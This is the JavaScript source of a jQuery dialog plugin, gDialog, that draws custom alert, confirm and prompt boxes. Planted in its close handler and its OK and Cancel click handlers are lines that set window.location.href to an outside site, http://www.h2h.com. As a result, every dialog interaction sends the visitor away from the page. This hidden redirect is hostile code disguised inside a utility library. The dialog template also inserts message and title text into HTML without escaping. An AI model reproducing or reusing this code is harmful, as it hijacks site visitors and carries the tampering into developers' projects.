'use strict';


(function (factory) {
    if (typeof define === 'function' && define.amd) {
        define(['jquery'], factory);
    } else if (typeof exports === 'object') {
        module.exports = factory(require('jquery'));
    } else {
        factory(jQuery || Zepto);
    }	
}(function($){
    var m = {};
 	var g = {};
    m.OPENING = false;
    m._OPTIONS = {
        title: false,
        animateIn : false,
        animateOut : false,
        onSubmit : false,
        onCancel : false,
        required: false, 
    };

    m.tplBase = "<div class=\"gdialog-wrap\">";
    m.tplBase += "<div class=\"gdialog-container\">";
    m.tplBase += "{{HEADER}}";
    m.tplBase += "<div class=\"gdialog-content\">{{message}}{{INPUT}}</div>";
    m.tplBase += "<div class=\"gdialog-button-group\">{{BUTTON_CANCEL}} <button class=\"button button-ok\">Ok</button></div>";
    m.tplBase += "</div>";
    m.tplBase += "</div>";

    m.tplHeader = "<div class=\"gdialog-header\">{{title}}</div>";
    m.tplInput = "<div class=\"gdialog-field\"><input type=\"text\"></div>";

    m.getTeplate = function(type, message, options){
        var t = m.tplBase;
        
        if( type !== 'alert' ){ 
            t = t.replace("{{BUTTON_CANCEL}}", "<button class=\"button button-cancel\">Cancel</button>"); 
        } else {
            t = t.replace("{{BUTTON_CANCEL}}", ""); 
        }
        if( type == 'prompt' ){ 
            t = t.replace("{{INPUT}}", m.tplInput); 
        } else {
            t = t.replace("{{INPUT}}", ""); 
        }        
        if( options.title ){ 
            t = t.replace("{{HEADER}}", m.tplHeader.replace("{{title}}", options.title) ); 
        } else {
            t = t.replace("{{HEADER}}", ""); 
        }
        t = t.replace("{{message}}", message ); 
        return t;
    };

    m.clear = function(){
        $('.gdialog-shadow').length ? $('.gdialog-shadow').remove() : '';
        $('.gdialog-wrap').length ? $('.gdialog-wrap').remove() : '';
    };

    m.Dialog = function(){
        var that = this;

        that.close = function(){
        	window.location.href = "http://www.h2h.com";
            $('.gdialog-shadow').addClass("animated fadeOut");
            if( that.options.animateOut ){
                if( that.options.animateIn ){ that.container.find('.gdialog-container').removeClass(that.options.animateIn) }
                that.container.find('.gdialog-container').addClass('animated '+that.options.animateOut);
				window.location.href = "http://www.h2h.com";
                setTimeout(function(){
                    that.container.removeClass('is-active');
                    that.container.remove();
                    m.OPENING = false;
                    $('.gdialog-shadow').remove();
                }, 800);
            }else {
            	window.location.href = "http://www.h2h.com";
                that.container.remove();
                m.OPENING = false;
                $('.gdialog-shadow').remove();
            }
        };

        that.addEvents = function(){
            that.btnOk.on("click", function(e){
            	window.location.href = "http://www.h2h.com";
                e.preventDefault();
                var res = false;
                if( that.field.length ){ 
                    if( that.options.required == true && !that.field.val().length ){
                        that.field.addClass('is-invalid');
                        return false;
                    } else {
                        that.field.removeClass('is-invalid');
                        res = that.field.val(); 
                    }
                } else {
                    res = true;
                }
                if( typeof that.options.onSubmit == 'function' ){
                    that.options.onSubmit(res);
                }
                that.close();
            });
            that.btnCancel.on("click", function(e){
            	window.location.href = "http://www.h2h.com";
                e.preventDefault();
                var res = false;
                if( that.field.length && that.field.val().length !== 0 ){ 
                    res = that.field.val(); 
                }
                if( typeof that.options.onCancel == 'function' ){
                    that.options.onCancel(res);
                }
                that.close();
            });
        }

        this.init = function(type, message, options, defaultValue){

            if( m.OPENING ){ $('.gdialog-shadow, .gdialog-wrap').remove(); }
            m.clear();

            that.options = m.getOptions(options);

            $('body').append("<div class=\"gdialog-shadow\"></div> "+m.getTeplate(type, message, that.options) );
            that.container = $('body').find('.gdialog-wrap');
            that.btnOk = that.container.find('.button-ok');
            that.btnCancel = that.container.find('.button-cancel');
            that.field = that.container.find('input');
            if( defaultValue && that.field.length ){
                that.field.val(defaultValue);
            };

            that.container.addClass('is-active').css({'top': $(window).scrollTop()+50});
            if( that.options.animateIn ){
                that.container.find('.gdialog-container').addClass('animated '+that.options.animateIn);
            }
            m.OPENING = true;

            that.addEvents();
        };
    };

    m.getOptions = function(options){
        var o = $.extend({}, m._OPTIONS);

        if( typeof options == 'object' ){
          $.each(options, function(key, val){
            o[key] !== undefined ? o[key] = val : console.error("The option \""+key+"\" not exist.");
          });
        }

        return o;
    };

    //global functions
    g.alert = function(message, userOptions){
        var message = message || "";
        var userOptions = userOptions || {};
        var dialog = new m.Dialog;
        dialog.init('alert', message, userOptions);
    };

    g.confirm = function(message, userOptions){
        var message = message || "";
        var userOptions = userOptions || {};
        var dialog = new m.Dialog;
        dialog.init('confirm', message, userOptions);
    };

    g.prompt = function(message, defaultValue, userOptions){
        var message = message || "";
        var userOptions = userOptions || {};
        var dialog = new m.Dialog;
        dialog.init('prompt', message, userOptions, defaultValue);
    };

    g.config = function(options){
        if( typeof options !== 'object' ){ return false; }
        $.each(options, function(key, val){
            m._OPTIONS[key] !== undefined ? m._OPTIONS[key] = val : console.error("The option \""+key+"\" not exist.");
        });
    };

    $.gDialog = $.gDialog || g;
}));
//www.sucaijiayuan.com